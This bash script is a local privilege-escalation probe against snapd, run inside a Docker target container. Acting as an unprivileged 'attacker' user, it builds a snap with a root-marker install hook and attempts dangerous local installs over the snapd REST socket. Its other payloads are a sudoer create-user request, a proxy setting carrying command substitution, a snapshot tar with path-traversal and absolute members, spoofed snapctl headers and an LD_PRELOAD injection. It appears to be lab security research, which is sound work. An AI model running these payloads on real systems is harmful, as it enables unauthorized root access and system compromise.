#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/snapd-rest-deep.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run_host() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

echo "snapd REST deep local LPE probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_host docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

ATTACKER=attacker
WORK=/tmp/snapd-rest-deep
SNAP_SRC=$WORK/snap-src
SNAP_FILE=/tmp/snapd-rest-deep-lpe_1.0_all.snap
ROOT_MARKER=/root/snapd_rest_deep_root_marker
TMP_MARKER=/tmp/snapd_rest_deep_tmp_marker
IMPORT_FILE=/tmp/snapd-rest-deep-import.tar
BAD_ASSERT=/tmp/snapd-rest-deep.assert

section() {
  printf '\n## %s\n' "$1"
}

run() {
  local label="$1"
  shift
  section "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  set +e
  "$@" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

run_attacker_sh() {
  local label="$1"
  local script="$2"
  section "$label"
  printf '$ runuser -u %q -- bash -lc %q\n' "$ATTACKER" "$script"
  set +e
  runuser -u "$ATTACKER" -- bash -lc "$script" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

curl_get() {
  local label="$1"
  local socket="$2"
  local path="$3"
  shift 3
  section "$label"
  printf 'socket=%s\npath=%s\n' "$socket" "$path"
  set +e
  runuser -u "$ATTACKER" -- curl --max-time 12 -sS -i --unix-socket "$socket" "$@" "http://localhost$path" | sed -n '1,80p'
  local rc=${PIPESTATUS[0]}
  set -e
  printf 'rc=%s\n' "$rc"
}

curl_json() {
  local label="$1"
  local socket="$2"
  local method="$3"
  local path="$4"
  local body="$5"
  shift 5
  section "$label"
  printf 'socket=%s\nmethod=%s\npath=%s\nbody=%s\n' "$socket" "$method" "$path" "$body"
  printf '%s' "$body" > "$WORK/request.json"
  chown "$ATTACKER:$ATTACKER" "$WORK/request.json"
  set +e
  runuser -u "$ATTACKER" -- curl --max-time 15 -sS -i --unix-socket "$socket" \
    -H 'Content-Type: application/json' "$@" -X "$method" --data-binary @"$WORK/request.json" \
    "http://localhost$path" | sed -n '1,100p'
  local rc=${PIPESTATUS[0]}
  set -e
  printf 'rc=%s\n' "$rc"
}

curl_raw() {
  local label="$1"
  local socket="$2"
  local method="$3"
  local path="$4"
  local input="$5"
  shift 5
  section "$label"
  printf 'socket=%s\nmethod=%s\npath=%s\ninput=%s\n' "$socket" "$method" "$path" "$input"
  set +e
  runuser -u "$ATTACKER" -- curl --max-time 15 -sS -i --unix-socket "$socket" \
    "$@" -X "$method" --data-binary @"$input" "http://localhost$path" | sed -n '1,100p'
  local rc=${PIPESTATUS[0]}
  set -e
  printf 'rc=%s\n' "$rc"
}

root_marker_check() {
  section "$1"
  if [ -e "$ROOT_MARKER" ]; then
    echo "ROOT_PROOF=YES"
    stat -c '%A %a %U:%G %s %n' "$ROOT_MARKER"
    sed -n '1,40p' "$ROOT_MARKER"
  else
    echo "ROOT_PROOF=NO"
  fi
  if [ -e "$TMP_MARKER" ]; then
    echo "TMP_MARKER=YES"
    stat -c '%A %a %U:%G %s %n' "$TMP_MARKER"
    sed -n '1,40p' "$TMP_MARKER"
  else
    echo "TMP_MARKER=NO"
  fi
}

cleanup() {
  set +e
  snap remove snapd-rest-deep-lpe >/dev/null 2>&1 || true
  rm -rf "$WORK" "$SNAP_FILE" "$IMPORT_FILE" "$BAD_ASSERT" /tmp/snapd-rest-deep-local.out
  rm -f "$ROOT_MARKER" "$TMP_MARKER" /tmp/snapd-rest-deep-preload.so /tmp/snapd-rest-deep-cli.out
  rm -f /run/snapd/lock/snapd-rest-deep-lpe.lock /run/snapd/lock/snapd_rest_deep.lock 2>/dev/null || true
}

section "pre-clean"
cleanup
mkdir -p "$WORK"
chmod 755 "$WORK"
chown "$ATTACKER:$ATTACKER" "$WORK"

section "target identity, packages, and snapd version"
cat /etc/os-release | sed -n '1,10p'
uname -a
id
id "$ATTACKER"
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\n' \
  snapd squashfs-tools apparmor policykit-1 polkitd dbus systemd curl 2>&1 | sort || true
snap version 2>&1 || true

section "default snapd service and socket reachability"
systemctl is-system-running 2>&1 || true
systemctl is-active snapd.service snapd.socket snapd.seeded.service 2>&1 || true
systemctl is-enabled snapd.service snapd.socket snapd.seeded.service 2>&1 || true
systemctl status --no-pager -l snapd.service snapd.socket snapd.seeded.service 2>&1 | sed -n '1,80p' || true
printf '\n[snapd.socket unit]\n'
systemctl cat snapd.socket 2>&1 | sed -n '1,80p' || true
printf '\n[socket modes]\n'
stat -Lc '%A %a %U:%G %n' /run/snapd.socket /run/snapd-snap.socket /run/snapd /var/lib/snapd /snap 2>&1 || true
printf '\n[listening unix sockets]\n'
ss -xlpn | grep -E '/run/snapd(-snap)?\.socket' || true
printf '\n[polkit snapd actions]\n'
awk '/io.snapcraft.snapd.manage/{flag=1} flag{print} /<\/action>/{if(flag){flag=0; print ""}}' /usr/share/polkit-1/actions/io.snapcraft.snapd.policy 2>/dev/null | sed -n '1,120p' || true

section "default snap state and writable snapd paths"
snap list --all 2>&1 || true
run "attacker snap list" runuser -u "$ATTACKER" -- snap list
find /run/snapd /var/lib/snapd /snap -maxdepth 3 -xdev -printf '%M %u:%g %p -> %l\n' 2>&1 | sed -n '1,160p' || true
run_attacker_sh "attacker writable snapd state search" \
  'find /run/snapd /var/lib/snapd /snap -xdev -writable -printf "%M %u:%g %p\n" 2>/dev/null | sed -n "1,120p"'

section "build attacker-controlled local snap with root marker hook"
install -d -o "$ATTACKER" -g "$ATTACKER" "$SNAP_SRC/meta/hooks" "$SNAP_SRC/bin"
cat >"$SNAP_SRC/meta/snap.yaml" <<'EOF'
name: snapd-rest-deep-lpe
version: "1.0"
summary: snapd REST deep LPE marker
description: Local marker snap for probing unprivileged snapd REST install and try paths.
base: core24
grade: stable
confinement: strict
apps:
  marker:
    command: bin/marker
EOF
cat >"$SNAP_SRC/bin/marker" <<'EOF'
#!/bin/sh
id
EOF
cat >"$SNAP_SRC/meta/hooks/install" <<EOF
#!/bin/sh
{
  echo "hook=install"
  date -u +%Y-%m-%dT%H:%M:%SZ
  id
  echo "SNAP_NAME=\${SNAP_NAME-}"
  echo "SNAP_REVISION=\${SNAP_REVISION-}"
} > "$ROOT_MARKER"
chmod 0600 "$ROOT_MARKER"
{
  echo "hook=install"
  id
} > "$TMP_MARKER"
chmod 0644 "$TMP_MARKER"
EOF
chmod 755 "$SNAP_SRC/bin/marker" "$SNAP_SRC/meta/hooks/install"
chown -R "$ATTACKER:$ATTACKER" "$SNAP_SRC"
run "snap pack as attacker" runuser -u "$ATTACKER" -- snap pack "$SNAP_SRC" /tmp
stat -c '%A %a %U:%G %s %n' "$SNAP_FILE" "$SNAP_SRC/meta/hooks/install" 2>&1 || true

section "prepare assertion and snapshot/import path payloads"
cat >"$BAD_ASSERT" <<'EOF'
type: account
authority-id: invalid
account-id: invalid
display-name: snapd rest deep invalid assertion
timestamp: 2026-05-16T00:00:00Z
username: invalid

openpgp c2lnbmF0dXJl
EOF
chown "$ATTACKER:$ATTACKER" "$BAD_ASSERT"
run_attacker_sh "build snapshot import tar with absolute and traversal-like members" \
  'set -e; python3 - <<'"'"'PY'"'"'
import io
import tarfile

payloads = {
    "root/snapd_rest_deep_root_marker": b"relative-root-marker\n",
    "../../root/snapd_rest_deep_root_marker": b"traversal-root-marker\n",
    "/root/snapd_rest_deep_root_marker": b"absolute-root-marker\n",
    "tmp/snapd_rest_deep_tmp_marker": b"tmp-marker\n",
}
with tarfile.open("/tmp/snapd-rest-deep-import.tar", "w") as tf:
    for name, data in payloads.items():
        info = tarfile.TarInfo(name)
        info.size = len(data)
        info.mode = 0o644
        info.uid = 1001
        info.gid = 1001
        info.uname = "attacker"
        info.gname = "attacker"
        tf.addfile(info, io.BytesIO(data))
PY
ls -l /tmp/snapd-rest-deep-import.tar'

curl_get "attacker GET /v2 on snapd socket" /run/snapd.socket /v2
curl_get "attacker GET /v2/system-info on snapd socket" /run/snapd.socket /v2/system-info
curl_get "attacker GET /v2/snaps on snapd socket" /run/snapd.socket /v2/snaps
curl_get "attacker GET /v2/apps select service on snapd socket" /run/snapd.socket '/v2/apps?select=service'
curl_get "attacker GET /v2/interfaces on snapd socket" /run/snapd.socket /v2/interfaces
curl_get "attacker GET /v2/connections on snapd socket" /run/snapd.socket /v2/connections
curl_get "attacker GET /v2/changes on snapd socket" /run/snapd.socket /v2/changes
curl_get "attacker GET /v2/snapshots on snapd socket" /run/snapd.socket /v2/snapshots
curl_get "attacker GET /v2/model on snapd socket" /run/snapd.socket /v2/model
curl_get "attacker GET /v2/notices on snapd socket" /run/snapd.socket /v2/notices

curl_json "attacker POST /v2/snaps store install" /run/snapd.socket POST /v2/snaps \
  '{"action":"install","snaps":["hello-world"],"channel":"stable"}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/snaps refresh" /run/snapd.socket POST /v2/snaps \
  '{"action":"refresh","snaps":["core24"]}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/snaps remove" /run/snapd.socket POST /v2/snaps \
  '{"action":"remove","snaps":["core24"],"purge":true}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/snaps JSON local snap path install" /run/snapd.socket POST /v2/snaps \
  '{"action":"install","snap-path":"/tmp/snapd-rest-deep-lpe_1.0_all.snap","dangerous":true,"devmode":true}' -H 'X-Allow-Interaction: true'
root_marker_check "root marker after JSON local snap-path install attempt"
curl_json "attacker POST /v2/snaps JSON try local directory" /run/snapd.socket POST /v2/snaps \
  '{"action":"try","snap-path":"/tmp/snapd-rest-deep/snap-src","devmode":true}' -H 'X-Allow-Interaction: true'
root_marker_check "root marker after JSON try local directory attempt"

section "attacker POST /v2/snaps multipart dangerous local snap upload"
set +e
runuser -u "$ATTACKER" -- curl --max-time 20 -sS -i --unix-socket /run/snapd.socket \
  -H 'X-Allow-Interaction: true' \
  -F action=install -F dangerous=true -F devmode=true -F "snap=@$SNAP_FILE" \
  http://localhost/v2/snaps | sed -n '1,100p'
printf 'rc=%s\n' "${PIPESTATUS[0]}"
set -e
root_marker_check "root marker after multipart local snap upload attempt"

run_attacker_sh "attacker CLI snap install dangerous local snap with path/env injection" \
  'set +e; env SNAPD_DEBUG=1 SNAP_MOUNT_DIR=/tmp/snapd-rest-deep/fake-mount SNAP_CONFINE_DEBUG=1 LD_PRELOAD=/tmp/snapd-rest-deep-preload.so snap install --dangerous --devmode /tmp/snapd-rest-deep-lpe_1.0_all.snap > /tmp/snapd-rest-deep-cli.out 2>&1; rc=$?; echo snap_install_rc=$rc; sed -n "1,80p" /tmp/snapd-rest-deep-cli.out; exit 0'
root_marker_check "root marker after CLI install attempt"
run_attacker_sh "attacker CLI snap try local directory" \
  'set +e; SNAPD_DEBUG=1 snap try --devmode /tmp/snapd-rest-deep/snap-src; echo snap_try_rc=$?'
root_marker_check "root marker after CLI try attempt"

curl_json "attacker POST /v2/interfaces connect" /run/snapd.socket POST /v2/interfaces \
  '{"action":"connect","slots":[{"snap":"core","slot":"network"}],"plugs":[{"snap":"snapd-rest-deep-lpe","plug":"network"}]}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/create-user sudoer" /run/snapd.socket POST /v2/create-user \
  '{"email":"root@example.invalid","sudoer":true,"known":true}' -H 'X-Allow-Interaction: true'
curl_raw "attacker POST /v2/assertions invalid assertion body" /run/snapd.socket POST /v2/assertions "$BAD_ASSERT" \
  -H 'Content-Type: application/x.ubuntu.assertion' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/snaps/system/conf config/env/path injection" /run/snapd.socket PUT /v2/snaps/system/conf \
  '{"experimental.parallel-instances":true,"proxy.http":"http://127.0.0.1:9/$(id>/root/snapd_rest_deep_root_marker)","proxy.https":"file:///../../root/snapd_rest_deep_root_marker","refresh.timer":"00:00-24:00/4"}' -H 'X-Allow-Interaction: true'
root_marker_check "root marker after system config attempt"
curl_json "attacker POST /v2/snapshots save-like action" /run/snapd.socket POST /v2/snapshots \
  '{"action":"snapshot","snaps":["snapd-rest-deep-lpe"],"users":["attacker"]}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/snapshots restore action" /run/snapd.socket POST /v2/snapshots \
  '{"action":"restore","set":1,"snaps":["snapd-rest-deep-lpe"],"users":["attacker"]}' -H 'X-Allow-Interaction: true'
curl_raw "attacker POST /v2/snapshots import tar body" /run/snapd.socket POST /v2/snapshots "$IMPORT_FILE" \
  -H 'Content-Type: application/octet-stream' -H 'X-Allow-Interaction: true'
section "attacker POST /v2/snapshots multipart import tar"
set +e
runuser -u "$ATTACKER" -- curl --max-time 20 -sS -i --unix-socket /run/snapd.socket \
  -H 'X-Allow-Interaction: true' \
  -F action=import -F "snapshot=@$IMPORT_FILE;type=application/octet-stream" \
  http://localhost/v2/snapshots | sed -n '1,100p'
printf 'rc=%s\n' "${PIPESTATUS[0]}"
set -e
root_marker_check "root marker after snapshot/import attempts"
curl_json "attacker POST /v2/systems install-seed-like action" /run/snapd.socket POST /v2/systems \
  '{"action":"install","label":"../../root/snapd_rest_deep_root_marker","mark-default":true}' -H 'X-Allow-Interaction: true'
curl_json "attacker POST /v2/system-recovery-keys" /run/snapd.socket POST /v2/system-recovery-keys \
  '{"action":"reveal"}' -H 'X-Allow-Interaction: true'

curl_get "attacker GET /v2/system-info on snap socket" /run/snapd-snap.socket /v2/system-info
curl_get "attacker GET /v2/system-info on snap socket with spoofed snap headers" /run/snapd-snap.socket /v2/system-info \
  -H 'X-Snapd-Snap: core' -H 'X-Snapd-Context: bogus'
curl_get "attacker GET /v2/snaps on snap socket with spoofed snap headers" /run/snapd-snap.socket /v2/snaps \
  -H 'X-Snapd-Snap: snapd-rest-deep-lpe' -H 'X-Snapd-Context: bogus'
curl_json "attacker POST snap-socket /v2/snapctl get system" /run/snapd-snap.socket POST /v2/snapctl \
  '{"context-id":"bogus","args":["get","system"]}' -H 'X-Snapd-Snap: core' -H 'X-Snapd-Context: bogus'
curl_json "attacker POST snap-socket /v2/snapctl set system marker" /run/snapd-snap.socket POST /v2/snapctl \
  '{"context-id":"bogus","args":["set","system.snapd-rest-deep=/root/snapd_rest_deep_root_marker"]}' -H 'X-Snapd-Snap: core' -H 'X-Snapd-Context: bogus'
curl_json "attacker POST snap-socket /v2/snapctl services" /run/snapd-snap.socket POST /v2/snapctl \
  '{"context-id":"bogus","args":["services","--global"]}' -H 'X-Snapd-Snap: core' -H 'X-Snapd-Context: bogus'
root_marker_check "root marker after snap-socket snapctl attempts"

section "final root marker verdict before cleanup"
if [ -e "$ROOT_MARKER" ]; then
  echo "FINAL_ROOT_PROOF=YES"
  stat -c '%A %a %U:%G %s %n' "$ROOT_MARKER"
  sed -n '1,80p' "$ROOT_MARKER"
else
  echo "FINAL_ROOT_PROOF=NO"
fi

section "cleanup"
cleanup
findmnt | grep -E 'snapd-rest-deep|snapd_rest_deep' || true
ls -ld "$WORK" "$SNAP_FILE" "$ROOT_MARKER" "$TMP_MARKER" "$IMPORT_FILE" "$BAD_ASSERT" 2>&1 || true

section "final snapd health and installed snap state"
systemctl is-system-running 2>&1 || true
systemctl is-active snapd.service snapd.socket snapd.seeded.service 2>&1 || true
systemctl --failed --no-pager 2>&1 || true
snap list --all 2>&1 || true
run "attacker final snap list" runuser -u "$ATTACKER" -- snap list
TARGET_SCRIPT
